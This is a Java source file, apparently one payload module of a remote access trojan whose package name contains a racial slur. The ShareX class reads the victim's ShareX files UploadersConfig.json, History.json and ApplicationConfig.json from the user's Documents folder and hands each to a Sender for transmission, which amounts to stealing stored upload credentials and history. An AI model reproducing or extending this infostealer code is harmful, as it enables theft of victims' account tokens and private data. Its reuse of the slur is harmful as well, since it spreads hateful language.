package me.nigger.rat.payload.impl;

import me.nigger.rat.payload.Payload;
import me.nigger.rat.payload.Sender;
import me.nigger.rat.util.FileUtil;

public final class ShareX implements Payload
{
    @Override
    public void execute() throws Exception
    {
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "UploadersConfig.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "History.json").ifPresent(Sender::send);
        FileUtil.getFile(System.getProperty("user.home") + "\\Documents\\ShareX\\" + "ApplicationConfig.json").ifPresent(Sender ::send);
    }
}
